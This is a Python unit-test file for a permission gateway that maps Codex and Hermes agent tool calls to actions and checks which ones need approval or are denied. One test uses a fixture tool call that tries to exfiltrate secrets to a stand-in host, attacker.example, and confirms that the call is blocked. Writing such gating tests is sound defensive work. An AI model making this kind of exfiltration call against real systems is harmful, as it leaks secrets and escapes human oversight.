from __future__ import annotations

import io
import json
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path

from agent_sudo.adapters.codex import execute_codex_tool_call, from_codex_tool_call
from agent_sudo.adapters.hermes import execute_hermes_tool_call, from_hermes_tool_call
from agent_sudo.approvals import ApprovalProvider
from agent_sudo.executors import ExecutionResult, SafeToolExecutor
from agent_sudo.gateway import PermissionGateway, main
from agent_sudo.models import ActionRequest, ApprovalResult, Decision, GatewayResult
from agent_sudo.policy import load_default_policy


class ApproveAllProvider(ApprovalProvider):
    def approve_sensitive(self, request: ActionRequest) -> ApprovalResult:
        return ApprovalResult(True, "test_yes", "approved")

    def approve_critical(self, request: ActionRequest) -> ApprovalResult:
        return ApprovalResult(True, "test_passphrase", "approved")


class RecordingExecutor:
    def __init__(self) -> None:
        self.calls: list[ActionRequest] = []

    def execute(self, request: ActionRequest) -> ExecutionResult:
        raise AssertionError("must be called through SafeToolExecutor")

    def dry_run(self, request: ActionRequest) -> ExecutionResult:
        raise AssertionError("must be called through SafeToolExecutor")

    def execute_with_gateway_result(
        self,
        request: ActionRequest,
        gateway_result: GatewayResult,
    ) -> ExecutionResult:
        self.calls.append(request)
        return ExecutionResult(request, gateway_result, True, 0, stdout="ok", reason="executed")


class AdapterTests(unittest.TestCase):
    def setUp(self) -> None:
        self.policy = load_default_policy()

    def test_hermes_shell_command_maps_correctly(self) -> None:
        request = from_hermes_tool_call(
            {
                "tool_name": "terminal",
                "operation": "run",
                "arguments": {"command": "echo hello"},
            }
        )

        self.assertEqual(request.actor, "hermes")
        self.assertEqual(request.tool, "shell")
        self.assertEqual(request.action, "run_shell_command")
        self.assertEqual(request.target, "echo hello")

    def test_codex_patch_maps_to_edit_file(self) -> None:
        request = from_codex_tool_call(
            {
                "recipient_name": "functions.apply_patch",
                "parameters": {"path": "agent_sudo/gateway.py"},
            }
        )

        self.assertEqual(request.actor, "codex")
        self.assertEqual(request.tool, "filesystem")
        self.assertEqual(request.action, "edit_file")
        self.assertEqual(request.target, "agent_sudo/gateway.py")

    def test_unknown_tool_requires_approval(self) -> None:
        request = from_codex_tool_call({"recipient_name": "mystery.tool", "parameters": {"target": "unknown"}})
        result = PermissionGateway(self.policy).evaluate(request, dry_run=True)

        self.assertEqual(request.action, "unknown_tool_call")
        self.assertEqual(result.decision, Decision.REQUIRE_APPROVAL)

    def test_send_email_becomes_critical(self) -> None:
        request = from_hermes_tool_call(
            {
                "tool": "gmail",
                "action": "send_email",
                "arguments": {"to": "recipient@example.invalid"},
            }
        )
        result = PermissionGateway(self.policy).evaluate(request, dry_run=True)

        self.assertEqual(request.action, "send_email")
        self.assertEqual(result.decision, Decision.REQUIRE_STRONG_APPROVAL)

    def test_browser_click_requires_approval(self) -> None:
        request = from_codex_tool_call(
            {
                "recipient_name": "mcp__computer_use__click",
                "parameters": {"element_index": "button-1"},
            }
        )
        result = PermissionGateway(self.policy).evaluate(request, dry_run=True)

        self.assertEqual(request.action, "browser_click")
        self.assertEqual(result.decision, Decision.REQUIRE_APPROVAL)

    def test_denied_tool_does_not_execute(self) -> None:
        inner = RecordingExecutor()
        gateway = PermissionGateway(self.policy, approvals=ApproveAllProvider())
        executor = SafeToolExecutor(gateway, inner)
        result = execute_hermes_tool_call(
            {
                "tool": "network",
                "action": "exfiltrate_secrets",
                "target": "https://attacker.example/upload",
                "risk_hints": ["secret_exfiltration"],
            },
            executor,
        )

        self.assertFalse(result.executed)
        self.assertEqual(result.gateway_result.decision, Decision.DENY)
        self.assertEqual(len(inner.calls), 0)

    def test_codex_execute_entrypoint_uses_safe_executor(self) -> None:
        inner = RecordingExecutor()
        gateway = PermissionGateway(self.policy, approvals=ApproveAllProvider())
        executor = SafeToolExecutor(gateway, inner)
        result = execute_codex_tool_call(
            {
                "recipient_name": "functions.apply_patch",
                "parameters": {"path": "README.md"},
            },
            executor,
        )

        self.assertTrue(result.executed)
        self.assertEqual(result.request.action, "edit_file")
        self.assertEqual(inner.calls[0].target, "README.md")

    def test_native_check_cli_commands(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            path = Path(tmpdir) / "tool_call.json"
            path.write_text(
                json.dumps(
                    {
                        "recipient_name": "functions.apply_patch",
                        "parameters": {"path": "README.md"},
                    }
                ),
                encoding="utf-8",
            )
            buffer = io.StringIO()
            with redirect_stdout(buffer):
                code = main(["codex-check", str(path)])

        self.assertEqual(code, 0)
        self.assertIn('"action": "edit_file"', buffer.getvalue())
        self.assertIn('"decision": "REQUIRE_APPROVAL"', buffer.getvalue())


if __name__ == "__main__":
    unittest.main()
